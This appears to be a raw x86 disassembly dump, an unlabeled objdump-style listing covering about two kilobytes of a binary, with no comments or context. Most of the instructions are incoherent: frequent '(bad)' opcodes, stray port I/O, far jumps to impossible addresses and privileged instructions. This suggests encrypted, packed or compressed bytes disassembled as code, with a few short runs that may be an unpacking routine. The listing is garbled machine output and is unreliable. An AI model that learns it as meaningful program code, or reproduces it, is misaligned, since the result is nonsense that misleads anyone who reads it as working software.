  417216:	stos   BYTE PTR es:[edi],al
  417217:	jb     0x417207
  417219:	pop    ecx
  41721a:	sub    al,0x5e
  41721c:	je     0x4171b6
  41721e:	mov    dl,0x29
  417220:	inc    esp
  417221:	(bad)  
  417222:	mov    ebx,0xa283109d
  417227:	push   ds
  417228:	lods   al,BYTE PTR ds:[esi]
  417229:	mov    ds:0xe190a9a3,eax
  41722e:	xor    BYTE PTR [ebx],ch
  417230:	sbb    esi,DWORD PTR [ebx+0x44]
  417233:	iret   
  417234:	xor    cl,bl
  417236:	xchg   ebx,eax
  417237:	ret    
  417238:	inc    edx
  417239:	test   al,0x93
  41723b:	mov    eax,ds:0xe8656f41
  417240:	rcr    BYTE PTR [ebp+eiz*1-0x4891cff2],1
  417247:	pop    ebx
  417248:	cwde   
  417249:	pusha  
  41724a:	and    edi,esp
  41724c:	daa    
  41724d:	mov    esi,0x588bedc7
  417252:	xlat   BYTE PTR ds:[ebx]
  417253:	pop    edi
  417254:	xchg   edx,eax
  417255:	push   eax
  417256:	loope  0x41729d
  417258:	push   edx
  417259:	repz pop ebp
  41725b:	in     eax,dx
  41725c:	out    dx,al
  41725d:	add    edi,DWORD PTR ds:[ebx-0x11b3fe0a]
  417264:	daa    
  417265:	hlt    
  417266:	jmp    0xfa9294f9
  41726b:	push   ecx
  41726c:	sub    al,0x9c
  41726e:	cmp    al,0x66
  417270:	inc    esp
  417271:	iret   
  417272:	push   ebp
  417273:	pop    ebx
  417274:	repz popf 
  417276:	dec    edx
  417277:	sbb    ah,BYTE PTR [ebp-0x27e38559]
  41727d:	mov    eax,ds:0xdab9774d
  417282:	ja     0x41722c
  417284:	adc    BYTE PTR [edi-0x518f7a9d],bh
  41728a:	gs (bad) 
  41728c:	fisubr WORD PTR [ecx+0x4a]
  41728f:	(bad)  
  417290:	std    
  417291:	jb     0x417259
  417293:	pop    ebp
  417294:	popf   
  417295:	aas    
  417296:	push   ds
  417297:	push   es
  417298:	adc    eax,0xac496831
  41729d:	mov    BYTE PTR [eax-0x592f09b2],dh
  4172a3:	out    dx,eax
  4172a4:	mov    dl,0xbb
  4172a6:	inc    ebp
  4172a7:	and    BYTE PTR [ebx-0x41],ch
  4172aa:	xchg   edi,eax
  4172ab:	push   ecx
  4172ac:	lock jmp 0xb75de637
  4172b2:	cmp    eax,0xed6d10b7
  4172b7:	mov    ebp,0xede4850b
  4172bc:	in     al,0x70
  4172be:	shr    BYTE PTR [ebp-0x46],1
  4172c1:	stc    
  4172c2:	dec    ebx
  4172c3:	or     al,0x37
  4172c5:	inc    ebp
  4172c6:	int    0x2f
  4172c8:	mov    ds:0x7c181708,al
  4172cd:	or     bl,BYTE PTR [esi]
  4172cf:	jae    0x4172c8
  4172d1:	or     eax,0xca78b702
  4172d6:	arpl   si,cx
  4172d8:	pop    ecx
  4172d9:	fidiv  DWORD PTR gs:[ecx+0x2a10685d]
  4172e0:	add    bl,BYTE PTR [ebp-0x60]
  4172e3:	(bad)  
  4172e4:	jmp    0x417269
  4172e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172e7:	push   ebx
  4172e8:	loopne 0x417305
  4172ea:	stc    
  4172eb:	inc    esp
  4172ec:	aad    0xc8
  4172ee:	inc    edx
  4172ef:	cmp    ebp,eax
  4172f1:	jmp    0x7249:0x4bb406a7
  4172f8:	mov    edx,0x21ba4eb8
  4172fd:	imul   ebp,DWORD PTR [ebx],0xdc816003
  417303:	fcomp  DWORD PTR [ebp-0x2e]
  417306:	icebp  
  417307:	mov    esp,0x3bd1aa8c
  41730c:	cs dec ecx
  41730e:	enter  0x3c29,0xa5
  417312:	sub    eax,0x5ea9370a
  417317:	push   eax
  417318:	iret   
  417319:	popa   
  41731a:	in     eax,dx
  41731b:	sub    BYTE PTR [edi],ah
  41731d:	sti    
  41731e:	jb     0x4172ff
  417320:	xchg   edx,eax
  417321:	sbb    edi,DWORD PTR [ebx+0x67f853a6]
  417327:	aam    0xb3
  417329:	pop    ebp
  41732a:	sbb    al,0x8
  41732c:	in     eax,0x9b
  41732e:	mov    edx,0x681468c3
  417333:	pop    ds
  417334:	ret    0x9310
  417337:	rcl    ecx,1
  417339:	daa    
  41733a:	and    eax,0x2e3cc0e1
  41733f:	jns    0x41731b
  417341:	cmp    esp,DWORD PTR [esi+ebp*4-0x54]
  417345:	xchg   ecx,eax
  417346:	retf   0x7a4d
  417349:	aad    0x26
  41734b:	outs   dx,DWORD PTR ds:[esi]
  41734c:	in     eax,0xdb
  41734e:	mov    eax,ss
  417350:	fmul   QWORD PTR [esi]
  417352:	push   ss
  417353:	or     esi,DWORD PTR [ebx-0xb]
  417356:	cmp    ch,bl
  417358:	push   eax
  417359:	inc    edx
  41735a:	mov    eax,0x2cc9cb08
  41735f:	add    ebx,DWORD PTR [esi]
  417361:	jmp    FWORD PTR [eax+0x60]
  417364:	(bad)  
  417365:	arpl   WORD PTR [eax-0x7b5c5113],si
  41736b:	loopne 0x41730a
  41736d:	xchg   esi,eax
  41736e:	pop    esp
  41736f:	cmp    eax,0xc3b63274
  417374:	das    
  417375:	ffreep st(1)
  417377:	sub    al,0x79
  417379:	xchg   BYTE PTR [eax+0x796b5544],bh
  41737f:	add    BYTE PTR [edi],bl
  417381:	in     eax,0x6f
  417383:	xlat   BYTE PTR ds:[ebx]
  417384:	repz xchg esi,eax
  417386:	(bad)
  41738b:	iret   
  41738c:	mov    DWORD PTR [ebx-0x3c578ce1],ebp
  417392:	mov    ds:0xd5eaacaf,eax
  417397:	sbb    eax,0xf20a4be9
  41739c:	leave  
  41739d:	sbb    DWORD PTR [ecx-0x55],ebp
  4173a0:	repnz in al,0x18
  4173a3:	cwde   
  4173a4:	mov    edi,0x885ae6f5
  4173a9:	sub    BYTE PTR [ebp+0x77888810],ch
  4173af:	add    al,0x9b
  4173b1:	ss push 0x3f
  4173b4:	into   
  4173b5:	xchg   esi,eax
  4173b6:	ja     0x417385
  4173b8:	xchg   esi,eax
  4173b9:	not    DWORD PTR [esi-0x12]
  4173bc:	mov    esp,0x82883a53
  4173c1:	and    eax,ecx
  4173c3:	sahf   
  4173c4:	xor    ebp,DWORD PTR ds:[ecx]
  4173c7:	dec    edi
  4173c8:	(bad)
  4173cb:	sub    DWORD PTR [eax+0x54821548],0x2e73ae34
  4173d5:	unpckhps xmm0,xmm2
  4173d8:	call   0x452c:0xe10aeaef
  4173df:	mov    ecx,0xff99de19
  4173e4:	mov    DWORD PTR [eax+eax*1-0x63],ebx
  4173e8:	and    eax,0x5e1ff01a
  4173ed:	into   
  4173ee:	(bad)  
  4173ef:	lock in eax,dx
  4173f1:	iret   
  4173f2:	mov    edi,0xb570a264
  4173f7:	jbe    0x41744f
  4173f9:	rol    ebp,0x3e
  4173fc:	dec    edx
  4173fd:	xchg   ebx,eax
  4173fe:	stc    
  4173ff:	outs   dx,BYTE PTR ds:[esi]
  417400:	addr16 pop esp
  417402:	jae    0x4173d7
  417404:	or     cl,BYTE PTR [eax+eax*8]
  417407:	dec    ebx
  417408:	pop    edi
  417409:	pop    ecx
  41740a:	jo     0x41739f
  41740c:	outs   dx,DWORD PTR ds:[esi]
  41740e:	and    eax,0x311fce07
  417413:	xchg   ebp,eax
  417414:	call   FWORD PTR [edx+0x55]
  417417:	fs popa 
  417419:	add    eax,0xdffc2e4b
  41741e:	mov    ebp,0x466c3f06
  417423:	push   esi
  417424:	retf   
  417425:	mov    ebx,0x54f3cc82
  41742a:	test   al,0xc4
  41742c:	xor    esp,DWORD PTR [edx]
  41742e:	adc    al,0x6
  417430:	popa   
  417431:	and    dh,BYTE PTR [eax]
  417433:	daa    
  417434:	(bad)  
  417435:	imul   edx,DWORD PTR [ecx],0x6d69135e
  41743b:	mov    ch,0x68
  41743d:	push   ss
  41743e:	jns    0x417472
  417440:	in     eax,0x10
  417442:	les    eax,FWORD PTR [edi-0x38]
  417445:	ret    0x98ad
  417448:	stos   BYTE PTR es:[edi],al
  417449:	or     eax,0x25c12e17
  41744e:	data16 jg 0x4174ab
  417451:	mov    ds:0xb1c51a29,eax
  417456:	fidivr WORD PTR [ecx+0x52ae7c02]
  41745c:	push   ecx
  41745d:	call   0x41dfae
  417462:	mov    eax,DWORD PTR [esi]
  417464:	mov    ecx,DWORD PTR [esi+0x4]
  417467:	shrd   eax,ecx,0x2
  41746b:	shr    ecx,0x2
  41746e:	shr    edx,0x1e
  417471:	xor    ecx,0xe702a276
  417477:	jmp    0x417a01
  41747c:	repnz fadd DWORD PTR [eax-0xd9b9f7c]
  417483:	pop    eax
  417484:	loop   0x417458
  417486:	fsubr  DWORD PTR [eax-0x51430090]
  41748c:	fimul  WORD PTR [edi+0x43d160c]
  417492:	push   ss
  417493:	push   ss
  417494:	jo     0x41744a
  417496:	xchg   edi,eax
  417497:	sub    eax,0x895add75
  41749c:	jp     0x4174e8
  41749e:	xor    eax,0x7685a68e
  4174a3:	adc    BYTE PTR [ecx+0x1c14f7ce],ch
  4174a9:	jo     0x417459
  4174ab:	push   esp
  4174ac:	jecxz  0x41752c
  4174ae:	icebp  
  4174af:	test   eax,0xcec94d6c
  4174b4:	repz repz add cl,0x59
  4174b9:	(bad)  
  4174ba:	pop    edx
  4174bb:	mov    ch,0xb5
  4174bd:	mov    DWORD PTR [ecx+ebx*2+0x3eb0ab42],ebx
  4174c4:	xchg   DWORD PTR [edi+0x2a1d092e],ebx
  4174ca:	push   cs
  4174cb:	mov    ebp,0x5060d476
  4174d0:	scas   al,BYTE PTR es:[edi]
  4174d1:	adc    ebp,DWORD PTR [ecx-0x2b]
  4174d4:	(bad)  
  4174d5:	lock pop ds
  4174d7:	sub    DWORD PTR [edx-0x54],edx
  4174da:	enter  0x4f38,0xbc
  4174de:	lods   al,BYTE PTR ds:[esi]
  4174df:	adc    BYTE PTR [edi],al
  4174e1:	pop    ds
  4174e2:	cmp    DWORD PTR [ebx],ebx
  4174e4:	outs   dx,BYTE PTR ds:[esi]
  4174e5:	outs   dx,DWORD PTR ds:[esi]
  4174e6:	int3   
  4174e7:	push   es
  4174e8:	pop    edi
  4174e9:	pop    edi
  4174ea:	dec    DWORD PTR [edx]
  4174ec:	adc    cl,dh
  4174ee:	popf   
  4174ef:	jne    0x4174cd
  4174f1:	in     eax,dx
  4174f2:	jmp    0x4174ce
  4174f4:	pushf  
  4174f5:	out    dx,al
  4174f6:	ret    0x9ef5
  4174f9:	adc    ch,BYTE PTR [edx+0x9]
  4174fc:	test   al,0x25
  4174fe:	imul   ecx,edi,0x3498cea8
  417504:	fwait
  417505:	out    0x56,eax
  417507:	out    0xc8,eax
  417509:	andnps xmm0,xmm3
  41750c:	mov    al,ds:0xfbd9e3cd
  417511:	repnz fldenv [edx+0x143aad9]
  417518:	cmp    al,0x76
  41751a:	inc    edx
  41751b:	cmp    BYTE PTR fs:[ebx+edx*1],ch
  41751f:	xor    al,0xbb
  417521:	addr16 xchg ebx,eax
  417523:	out    dx,eax
  417524:	enter  0x2bf3,0x1f
  417528:	fstp   DWORD PTR [ebx]
  41752a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41752b:	cmp    DWORD PTR [eax-0x7c189fef],0x13
  417532:	and    BYTE PTR [edi],dh
  417534:	xor    al,bh
  417536:	movntq QWORD PTR [ebx],mm7
  417539:	(bad)  
  41753a:	dec    esi
  41753b:	je     0x4174c6
  41753d:	stc    
  41753e:	dec    esp
  41753f:	mov    al,0x40
  417541:	xchg   edi,eax
  417542:	push   0xffffffb3
  417544:	jle    0x41757e
  417546:	(bad)  
  417547:	sub    cl,BYTE PTR [ecx+0x4671ce0c]
  41754d:	les    ecx,FWORD PTR [edi+ebx*2+0x79f6fdef]
  417554:	lahf   
  417555:	fs scas eax,DWORD PTR es:[edi]
  417557:	loop   0x41757a
  417559:	ss dec edx
  41755b:	pusha  
  41755c:	mov    dl,BYTE PTR fs:[ebx+0x4e]
  417560:	addr16 mov dl,0xe6
  417563:	repnz sub cl,BYTE PTR [esi]
  417566:	or     al,0xf4
  417568:	in     eax,dx
  417569:	sub    esi,ebx
  41756b:	fdivrp st(5),st
  41756d:	sub    ah,bh
  41756f:	inc    esp
  417570:	adc    DWORD PTR [ebx*1+0x42ab1b5a],ecx
  417577:	out    dx,al
  417578:	jge    0x417534
  41757a:	fild   DWORD PTR [ecx-0x3e]
  41757d:	js     0x417582
  41757f:	mov    edx,0xd892b168
  417584:	data16 outs dx,BYTE PTR ds:[esi]
  417586:	inc    bx
  417588:	xor    BYTE PTR [ebp+0x71],dh
  41758b:	add    BYTE PTR [ebx-0x42302d10],cl
  417591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417592:	cmc    
  417593:	enter  0xf947,0xd6
  417597:	xchg   ebx,eax
  417598:	xor    BYTE PTR [edx+0x10e746c3],dh
  41759e:	mov    eax,0xaf580f20
  4175a3:	in     eax,0xb8
  4175a5:	xor    al,0xda
  4175a7:	and    BYTE PTR [edx+0x40ee32ef],ah
  4175ad:	cmp    eax,0x84f2069b
  4175b2:	jp     0x41753f
  4175b4:	push   cs
  4175b5:	in     eax,0xd
  4175b7:	clc    
  4175b8:	into   
  4175b9:	es xchg edi,eax
  4175bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175bc:	ret    0xa0fc
  4175bf:	adc    ch,BYTE PTR [eax+edx*2+0x507068de]
  4175c6:	sbb    BYTE PTR [esi+0x2ce9f3ec],al
  4175cc:	jmp    0x417628
  4175ce:	in     eax,dx
  4175cf:	test   al,0xf4
  4175d1:	ja     0x417559
  4175d3:	sub    DWORD PTR [ebx+0x3723e5e8],esp
  4175d9:	je     0x4175aa
  4175db:	out    0x17,eax
  4175dd:	fstp   DWORD PTR [edx-0x7d]
  4175e0:	outs   dx,DWORD PTR ds:[esi]
  4175e1:	adc    DWORD PTR [ebx+0x78],edx
  4175e4:	mov    ecx,DWORD PTR ds:0xd084244a
  4175ea:	cdq    
  4175eb:	mov    esp,0xbe71031b
  4175f0:	pop    eax
  4175f1:	add    al,0x8e
  4175f3:	adc    eax,0x537c043d
  4175f8:	adc    DWORD PTR [esi+esi*2+0x6ba6c75e],edi
  4175ff:	add    BYTE PTR [eax+ebx*1],0x43
  417603:	mov    ah,0xe4
  417605:	mov    al,ds:0x8ae8b34a
  41760a:	mov    edx,DWORD PTR [ebx+0x54bd556f]
  417610:	inc    edi
  417611:	sbb    BYTE PTR ds:0x5803b4f3,dl
  417617:	mov    al,0x95
  417619:	call   0x3993c85
  41761e:	mov    cl,0x2c
  417620:	inc    ebp
  417621:	jp     0x4175eb
  417623:	test   ebx,edi
  417625:	(bad)  
  417626:	in     eax,0x11
  417628:	push   edx
  417629:	xchg   edx,eax
  41762a:	stc    
  41762b:	xchg   edx,eax
  41762c:	adc    al,0xed
  41762e:	rol    DWORD PTR [ecx-0x3ca3d8f7],0x25
  417635:	dec    edx
  417636:	in     al,0x45
  417638:	jl     0x417617
  41763a:	and    DWORD PTR [esi-0x14098aa2],ebx
  417640:	jp     0x417695
  417642:	retf   
  417643:	or     BYTE PTR [edi-0x3],0x26
  417647:	std    
  417648:	mov    ebp,0x72cb6ea4
  41764d:	push   0x80ec2411
  417652:	push   0x5f7fd3cf
  417657:	lods   al,BYTE PTR cs:[esi]
  417659:	jae    0x4175e4
  41765b:	out    0x8e,al
  41765d:	or     al,0xc1
  41765f:	adc    BYTE PTR [ebx-0x2],dh
  417662:	adc    dh,BYTE PTR [eax-0x6dbb6eb3]
  417668:	push   edi
  417669:	pushf  
  41766a:	leave  
  41766b:	ret    
  41766c:	and    eax,0x82762ad6
  417671:	pop    eax
  417672:	push   ds
  417673:	jmp    DWORD PTR [eax]
  417676:	add    bh,BYTE PTR [ebx+edx*8+0x48]
  41767a:	loop   0x417666
  41767c:	(bad)  
  41767d:	aaa    
  41767e:	xchg   ecx,eax
  41767f:	pop    ds
  417680:	mov    dl,0xb7
  417682:	xchg   ebx,eax
  417683:	mov    ah,0x2c
  417685:	(bad)  
  417686:	out    dx,eax
  417687:	add    bh,bl
  417689:	adc    al,ch
  41768b:	paddb  mm6,QWORD PTR [edx]
  41768e:	inc    ecx
  41768f:	adc    al,0xf4
  417691:	adc    al,0xe0
  417693:	in     al,0x93
  417695:	fstp   TBYTE PTR [ebp-0x42]
  417698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417699:	and    dh,cl
  41769b:	pop    ds
  41769c:	add    DWORD PTR [edi-0x68],ecx
  41769f:	jae    0x41767a
  4176a1:	lea    ebp,[eax-0x44]
  4176a4:	pushf  
  4176a5:	iret   
  4176a6:	adc    BYTE PTR [ebx-0x13232a75],ah
  4176ac:	in     al,0x6
  4176ae:	setge  BYTE PTR [ebx+0x2e434112]
  4176b5:	iret   
  4176b6:	cmp    BYTE PTR [esi],dl
  4176b8:	(bad)  
  4176b9:	push   edi
  4176ba:	bound  edi,QWORD PTR [ebx+eax*4+0x18246f15]
  4176c1:	mov    al,ds:0xc6dc2879
  4176c6:	stos   DWORD PTR es:[edi],eax
  4176c7:	dec    eax
  4176c8:	push   eax
  4176c9:	popaw  
  4176cb:	sar    BYTE PTR [ebp-0x25b956ce],cl
  4176d1:	cdq    
  4176d2:	push   edx
  4176d3:	jmp    0x4210:0x45deab8e
  4176da:	adc    al,0x8b
  4176dc:	and    DWORD PTR [edi],ebx
  4176de:	mov    bl,0x30
  4176e0:	sub    ah,al
  4176e2:	and    ch,dl
  4176e4:	dec    edx
  4176e5:	popf   
  4176e6:	pop    esp
  4176e7:	xchg   edi,eax
  4176e8:	inc    edi
  4176e9:	retf   
  4176ea:	sbb    edx,DWORD PTR [edx-0x1803674f]
  4176f0:	pop    ebp
  4176f1:	es jl  0x4176ef
  4176f4:	test   al,0x28
  4176f6:	mov    eax,ds:0xea28f046
  4176fb:	cwde   
  4176fc:	xchg   ecx,eax
  4176fd:	inc    esi
  4176fe:	lahf   
  4176ff:	mov    esi,0x5ba10265
  417704:	pop    edx
  417705:	jns    0x417777
  417707:	add    DWORD PTR [ecx],edi
  417709:	cld    
  41770a:	popw   ds
  41770c:	sbb    BYTE PTR [ebx],ch
  41770e:	push   esi
  41770f:	add    BYTE PTR [esi+0x67],dh
  417712:	xor    BYTE PTR cs:[ecx],ch
  417715:	fdivr  st,st(0)
  417717:	add    edx,esp
  417719:	cmp    dh,BYTE PTR [eax+0x1d23e274]
  41771f:	mov    esi,0x9441a53c
  417724:	xchg   dl,dh
  417726:	es push edi
  417728:	push   ebx
  417729:	cmp    BYTE PTR [ecx+0x63ffb2],ch
  41772f:	push   edi
  417730:	imul   bp,WORD PTR [edi-0x1f],0x4f
  417735:	add    al,0x61
  417737:	jbe    0x41779a
  417739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41773a:	xchg   ecx,eax
  41773b:	aaa    
  41773c:	xchg   ecx,eax
  41773d:	sub    al,ah
  41773f:	or     BYTE PTR [ecx-0x4a8dbef0],0x91
  417746:	mov    al,ds:0xd112b6bd
  41774b:	dec    ecx
  41774c:	xchg   BYTE PTR [ebp+0x7dc696c4],cl
  417752:	stos   BYTE PTR es:[edi],al
  417753:	mov    dh,BYTE PTR [edx-0x1f]
  417756:	out    0x39,eax
  417758:	cmp    edx,ebp
  41775a:	mul    BYTE PTR [edx]
  41775c:	push   es
  41775d:	sub    esi,DWORD PTR [eax]
  41775f:	jns    0x417774
  417761:	dec    esp
  417762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417763:	scas   al,BYTE PTR es:[edi]
  417764:	cmc    
  417765:	into   
  417766:	les    esp,FWORD PTR gs:[edx+eax*2]
  41776a:	dec    eax
  41776b:	mov    eax,0xe5449535
  417770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417771:	jne    0x41778d
  417773:	jno    0x41773c
  417775:	dec    ebx
  417776:	in     al,0x8b
  417778:	cli    
  417779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41777a:	lods   eax,DWORD PTR ds:[esi]
  41777b:	imul   ecx,DWORD PTR [ebx],0xffffffe4
  41777e:	retf   
  41777f:	test   BYTE PTR [ebx],cl
  417781:	(bad)  
  417782:	repnz add ebp,ecx
  417785:	inc    esi
  417786:	pop    esi
  417787:	jnp    0x417709
  417789:	ret    0x77a0
  41778c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41778d:	mov    dh,0xeb
  41778f:	aam    0x9d
  417791:	jg     0x41774a
  417793:	call   0xb529759
  417798:	cld    
  417799:	add    eax,0x48e00a38
  41779e:	aam    0xef
  4177a0:	adc    al,0xfe
  4177a2:	rol    BYTE PTR [ecx-0x44],0xf4
  4177a6:	stos   DWORD PTR es:[edi],eax
  4177a7:	jne    0x4177d9
  4177a9:	adc    ch,BYTE PTR ds:0x707e15da
  4177af:	shl    BYTE PTR [edi-0x71],0x62
  4177b3:	cs jno 0x417825
  4177b6:	mov    ecx,0x807b1667
  4177bb:	sub    cl,ch
  4177bd:	push   ss
  4177be:	or     BYTE PTR [eax+ebp*1-0x239bdd3e],bl
  4177c5:	nop
  4177c6:	cli    
  4177c7:	neg    ah
  4177c9:	jbe    0x417832
  4177cb:	xchg   ecx,eax
  4177cc:	call   0x11a42834
  4177d1:	scas   al,BYTE PTR es:[edi]
  4177d2:	jno    0x4177dc
  4177d4:	mov    eax,ds:0x915c84e3
  4177d9:	jg     0x4177d6
  4177db:	in     eax,0xec
  4177dd:	add    ebx,DWORD PTR [edx-0x7a78ad22]
  4177e3:	mov    edi,0xc68bfa2e
  4177e8:	jno    0x4177b8
  4177ea:	add    eax,0x1c51490b
  4177ef:	dec    ecx
  4177f0:	sbb    ch,0xa7
  4177f3:	lods   al,BYTE PTR ds:[esi]
  4177f4:	bound  edx,QWORD PTR ds:0x6278a0c7
  4177fa:	cmp    DWORD PTR [edx+0x5a],ebx
  4177fd:	mov    WORD PTR [edx+esi*4+0x48],ds
  417801:	enter  0xe6b1,0x11
  417805:	mov    edx,0x63d9f17e
  41780a:	out    dx,al
  41780b:	fs jg  0x4177eb
  41780e:	dec    eax
  41780f:	xchg   esp,eax
  417810:	push   ss
  417811:	mov    ch,0x35
  417813:	in     al,0x89
  417815:	jns    0x417893
  417817:	loope  0x417803
  417819:	fs test eax,0x6a1a3d45
  41781f:	xor    al,0x33
  417821:	push   esp
  417822:	sbb    eax,0x71daaa8
  417827:	test   DWORD PTR [esi+0x9],0x49653ccf
  41782e:	jmp    0xd168:0x297dd466
  417835:	or     edi,DWORD PTR ds:0x57d0c0c1
  41783b:	jg     0x417869
  41783d:	xchg   ecx,eax
  41783e:	mov    al,0x36
  417840:	shr    BYTE PTR [ecx-0x42e9973d],0x95
  417847:	push   DWORD PTR [esi-0x632e9cf4]
  41784d:	aaa    
  41784e:	pop    edi
  41784f:	test   eax,0x1701d888
  417854:	ja     0x4178b2
  417856:	and    eax,0xa48806fd
  41785b:	pop    ebx
  41785c:	jo     0x417810
  41785e:	je     0x4178ad
  417860:	cdq    
  417861:	cs pop ds
  417863:	jmp    0xc7dd2c3a
  417868:	mov    cl,0xef
  41786a:	push   ss
  41786b:	mov    al,ds:0xc58db38c
  417870:	mov    DWORD PTR [ecx+0x5e],esi
  417873:	mov    cl,0xb9
  417875:	cld    
  417876:	sub    eax,0x4b5b251a
  41787b:	popa   
  41787c:	jne    0x41784e
  41787e:	push   ds
  41787f:	sub    BYTE PTR ds:0x78c09f53,bl
  417885:	xchg   edi,eax
  417886:	inc    edi
  417887:	(bad)  
  417889:	and    eax,edi
  41788b:	(bad)  
  41788c:	ror    DWORD PTR [edi-0x1d05df36],cl
  417892:	(bad)  
  417893:	mov    edx,0x1db713d0
  417898:	or     BYTE PTR [ecx],ch
  41789a:	push   0xdc667164
  41789f:	inc    ebp
  4178a0:	fs sbb edi,eax
  4178a3:	out    dx,eax
  4178a4:	or     al,0x80
  4178a6:	xor    eax,DWORD PTR [eax+0x6a]
  4178a9:	cmc    
  4178aa:	in     al,dx
  4178ab:	xchg   ebp,eax
  4178ac:	xor    BYTE PTR [edx],cl
  4178ae:	inc    esi
  4178af:	lds    esp,FWORD PTR [esi-0x59]
  4178b2:	mov    bh,0x44
  4178b4:	xchg   BYTE PTR [edi-0x17],cl
  4178b7:	or     ah,BYTE PTR [esi-0x471156a8]
  4178bd:	sub    bh,bh
  4178bf:	jno    0x417841
  4178c1:	out    0x11,al
  4178c3:	out    dx,eax
  4178c4:	pop    esp
  4178c5:	inc    ecx
  4178c6:	and    al,0x6d
  4178c8:	sti    
  4178c9:	sbb    al,0x2a
  4178cb:	not    DWORD PTR [ecx+0x50d77ea1]
  4178d1:	dec    edi
  4178d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178d3:	fwait
  4178d4:	call   DWORD PTR [esp+ecx*4]
  4178d7:	mov    ah,0x7f
  4178d9:	test   dl,0x50
  4178dc:	stc    
  4178dd:	push   esi
  4178de:	xor    al,0x81
  4178e0:	iret   
  4178e1:	fcomp  st(0)
  4178e3:	push   edi
  4178e4:	xchg   ebp,eax
  4178e5:	int3   
  4178e6:	lods   al,BYTE PTR ds:[esi]
  4178e7:	loop   0x417885
  4178e9:	jns    0x4178ae
  4178eb:	and    DWORD PTR [ebp+edi*8-0x4cd37508],esi
  4178f2:	push   ax
  4178f4:	shl    ebp,0xb0
  4178f7:	mov    ebx,0xd9218da4
  4178fc:	adc    eax,eax
  4178fe:	gs mov edx,0xb94de0d6
  417904:	pop    edx
  417905:	mov    ebx,0xf47ff6d2
  41790a:	outs   dx,DWORD PTR ds:[esi]
  41790b:	push   ebx
  41790c:	jge    0x417908
  41790e:	cld    
  41790f:	shl    BYTE PTR [esp+edx*1-0x538cb0e3],0xf3
  417917:	dec    esp
  417918:	jno    0x4178aa
  41791a:	mov    bh,0xc
  41791c:	jns    0x41792c
  41791e:	dec    esp
  41791f:	aas    
  417920:	data16 addr16 in al,0xbc
  417924:	pop    edi
  417925:	out    0x88,eax
  417927:	imul   esp,DWORD PTR [eax+0x7e],0xc95e3595
  41792e:	push   edi
  41792f:	(bad)  
  417930:	jmp    0x494c9b51
  417935:	inc    edi
  417936:	cmp    al,0xfe
  417938:	sbb    esi,esp
  41793a:	and    eax,0x531435b2
  41793f:	stos   DWORD PTR es:[edi],eax
  417940:	cdq    
  417941:	and    DWORD PTR [esp+ecx*4],ecx
  417944:	inc    ecx
  417945:	sub    DWORD PTR [edi+ebx*4],ebp
  417948:	mov    BYTE PTR [ebp-0x4b],al
  41794b:	arpl   WORD PTR [eax],bp
  41794d:	mov    ah,0xe4
  41794f:	aas    
  417950:	or     BYTE PTR [esi+0x4ee3feca],0x17
  417957:	clc    
  417958:	pop    eax
  417959:	daa    
  41795a:	call   0x68bd1089
  41795f:	push   ebx
  417960:	je     0x417998
  417962:	adc    eax,0x2478fb85
  417967:	sbb    DWORD PTR [ebx+0x56303936],ebp
  41796d:	adc    esp,DWORD PTR [esi]
  41796f:	inc    edx
  417970:	es add ch,0xa8
  417974:	sub    DWORD PTR [ebp+0x3a26ce51],esp
  41797a:	les    esi,FWORD PTR [esi+0x3b]
  41797d:	in     al,0x77
  41797f:	fidivr DWORD PTR [edx]
  417981:	loopne 0x4179ea
  417983:	loopne 0x41799f
  417985:	xchg   edx,eax
  417986:	sti    
  417987:	mov    esi,0x88d7ca68
  41798c:	push   edi
  41798d:	and    al,0xa6
  41798f:	mov    cl,0xc3
  417991:	addr16 pop edi
  417993:	cmp    eax,0x7e08ecd
  417998:	adc    al,0xb7
  41799a:	(bad)  
  41799b:	mov    edi,0x80c11f87
  4179a0:	mov    al,0x8
  4179a2:	out    0x9f,al
  4179a4:	cdq    
  4179a5:	jnp    0x417a21
  4179a7:	mov    eax,DWORD PTR [ecx]
  4179a9:	stos   BYTE PTR es:[edi],al
  4179aa:	data16 jne 0x417993
  4179ad:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4179af:	in     al,0x19
  4179b1:	sbb    ch,BYTE PTR [ebx]
  4179b3:	jge    0x4179bb
  4179b5:	fst    QWORD PTR [edx+0x2b3cb369]
  4179bb:	mov    ebp,0x12c8c3f2
  4179c0:	outs   dx,BYTE PTR ds:[esi]
  4179c1:	sti    
  4179c2:	push   es
  4179c3:	enter  0x4fad,0x7c
  4179c7:	loop   0x417a06
  4179c9:	dec    esi
  4179ca:	dec    ecx
  4179cb:	mul    BYTE PTR [edi-0x23ebeb65]
  4179d1:	into   
  4179d2:	je     0x417a2e
  4179d4:	stc    
  4179d5:	lea    edi,[ebx]
  4179d7:	rcr    DWORD PTR [edx+0x4d],0xdd
  4179db:	call   0xacb:0xf84ec969
  4179e2:	test   eax,0xcbcaab9a
  4179e7:	lods   al,BYTE PTR ds:[esi]
  4179e8:	and    al,0x0
  4179ea:	(bad)  
  4179eb:	cwde   
  4179ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179ed:	imul   edx,DWORD PTR [ecx],0x3a3113c4
  4179f3:	repnz leave 
  4179f5:	aas    
  4179f6:	dec    eax
  4179f7:	xor    DWORD PTR [ebx+0x240c6e26],ebp
  4179fd:	rcr    DWORD PTR [ebp+0x4a],cl
  417a00:	fist   WORD PTR [ecx+0x33]
  417a03:	(bad)  
  417a04:	mov    DWORD PTR [ebp+0x10],edx
  417a07:	mov    edx,DWORD PTR [ebx]
  417a09:	jmp    0x417f93
  417a0e:	in     al,dx
  417a0f:	and    cl,BYTE PTR [esi-0x3d]
  417a12:	dec    eax
  417a13:	mov    ds:0xcc442870,eax
  417a18:	xor    BYTE PTR [edx+0x744a9194],0x4
  417a1f:	jnp    0x417a2d
  417a21:	push   ss
  417a22:	cmp    eax,0x3b161604
  417a27:	idiv   DWORD PTR [ecx]
  417a29:	out    dx,eax
